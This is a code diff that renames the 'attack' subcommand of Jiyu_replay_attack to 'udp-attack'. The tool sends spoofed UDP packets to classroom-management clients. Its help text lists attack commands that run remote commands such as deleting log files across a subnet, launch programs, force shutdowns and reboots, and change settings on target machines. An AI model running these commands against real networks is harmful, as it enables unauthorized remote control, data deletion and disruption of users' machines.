@@ -68,25 +68,25 @@ def main_parser():
     )
 
     attack_cmd = subcommand.add_parser(
-        "attack",
+        "udp-attack",
         help="Perform a Jiyu attack by sending crafted UDP packets to the target machine.",
         epilog="Example usage:\n"
-        '    python Jiyu_replay_attack attack -t 192.168.106.100 -m "Hello World"\n'
-        "    python Jiyu_replay_attack attack -t 192.168.106.104 -w https://www.github.com\n"
-        '    python Jiyu_replay_attack attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
-        "    python Jiyu_replay_attack attack -t 224.50.50.42 -e calc.exe\n"
-        "    python Jiyu_replay_attack attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
-        '    python Jiyu_replay_attack attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
-        '    python Jiyu_replay_attack attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
-        "    python Jiyu_replay_attack attack -t 192.168.106.255 -cw\n"
-        "    python Jiyu_replay_attack attack -t 192.168.106.100 -ctw\n"
-        "    python Jiyu_replay_attack attack -t 192.168.106.100 -n hacker 1000\n"
-        "    python Jiyu_replay_attack attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
-        '    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
-        '    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
-        '    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
-        "    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
-        "    python Jiyu_replay_attack attack -t 127.0.0.1 --setting",
+        '    python Jiyu_replay_attack udp-attack -t 192.168.106.100 -m "Hello World"\n'
+        "    python Jiyu_replay_attack udp-attack -t 192.168.106.104 -w https://www.github.com\n"
+        '    python Jiyu_replay_attack udp-attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
+        "    python Jiyu_replay_attack udp-attack -t 224.50.50.42 -e calc.exe\n"
+        "    python Jiyu_replay_attack udp-attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
+        '    python Jiyu_replay_attack udp-attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
+        '    python Jiyu_replay_attack udp-attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
+        "    python Jiyu_replay_attack udp-attack -t 192.168.106.255 -cw\n"
+        "    python Jiyu_replay_attack udp-attack -t 192.168.106.100 -ctw\n"
+        "    python Jiyu_replay_attack udp-attack -t 192.168.106.100 -n hacker 1000\n"
+        "    python Jiyu_replay_attack udp-attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
+        '    python Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
+        '    python Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
+        '    python Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
+        "    python Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
+        "    python Jiyu_replay_attack udp-attack -t 127.0.0.1 --setting",
         formatter_class=MaxWidthHelpFormatter,
     )
     network_config_group = attack_cmd.add_argument_group(
@@ -210,7 +210,7 @@ def main_parser():
         nargs="?",
         metavar="<setting-args>",
         const="--help",
-        help="Set specific settings on the target machine\nUse `Jiyu_replay_attack --setting` for help",
+        help="Set specific settings on the target machine\nUse `Jiyu_replay_attack udp-attack --setting` for help",
     )
     attack_action.add_argument(
         "--hex",
@@ -255,12 +255,12 @@ def setting_parser():
     """
     parser = argparse.ArgumentParser(
         description="Specify settings for the target machine",
-        usage='Jiyu_replay_attack attack <main-args> --setting="[setting-options]"',
+        usage='Jiyu_replay_attack udp-attack <main-args> --setting="[setting-options]"',
         argument_default=argparse.SUPPRESS,
         epilog="Example usage:\n"
-        '    python Jiyu_replay_attack attack -t 192.168.233.0/24 --setting=""\n'
-        '    python Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
-        '    python Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
+        '    python Jiyu_replay_attack udp-attack -t 192.168.233.0/24 --setting=""\n'
+        '    python Jiyu_replay_attack udp-attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
+        '    python Jiyu_replay_attack udp-attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
         formatter_class=MaxWidthHelpFormatter,
     )
     network = parser.add_argument_group("Network Configuration")
@@ -375,7 +375,7 @@ def main():
                 for ip, port, pid, name in list_udp_listeners(args.keywords):
                     print(args.detect_format.format(ip=ip, port=port, pid=pid, name=ascii(name)))
             return
-        elif args.subcommand == "attack":
+        elif args.subcommand == "udp-attack":
             logger: List[Any] = []
 
             teacher_ip = args.teacher_ip
